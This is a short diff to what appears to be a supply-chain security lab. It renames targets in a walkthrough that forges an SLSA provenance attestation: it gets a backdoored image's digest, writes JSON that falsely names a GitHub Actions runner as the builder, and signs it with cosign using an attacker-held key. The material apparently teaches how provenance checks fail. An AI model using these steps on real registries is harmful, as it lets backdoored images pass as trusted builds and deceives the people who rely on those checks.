@@ -2,7 +2,7 @@ Create a forged attestation that claims a malicious image was built by
 your trusted CI:
 
 ```
-MALICIOUS_DIGEST=$(crane digest registry:5000/weaklink-app:malicious)
+MALICIOUS_DIGEST=$(crane digest registry:5000/webapp:backdoor)
 
 cat > /app/forged-attestation.json << EOF
 {
@@ -10,16 +10,16 @@ cat > /app/forged-attestation.json << EOF
   "predicateType": "https://slsa.dev/provenance/v0.2",
   "subject": [
     {
-      "name": "registry:5000/weaklink-app",
+      "name": "registry:5000/webapp",
       "digest": {"sha256": "${MALICIOUS_DIGEST#sha256:}"}
     }
   ],
   "predicate": {
-    "builder": {"id": "https://github.com/weaklink-labs/ci-builder"},
-    "buildType": "https://github.com/weaklink-labs/build/v1",
+    "builder": {"id": "https://github.com/actions/runner"},
+    "buildType": "https://github.com/actions/runner/github-hosted",
     "invocation": {
       "configSource": {
-        "uri": "git+https://github.com/weaklink-labs/app@refs/heads/main"
+        "uri": "git+https://github.com/org/webapp@refs/heads/main"
       }
     }
   }
@@ -33,5 +33,5 @@ Now sign it with a key you control:
 cosign attest --key /app/cosign.key \
   --predicate /app/forged-attestation.json \
   --type slsaprovenance \
-  registry:5000/weaklink-app:malicious
+  registry:5000/webapp:backdoor
 ```
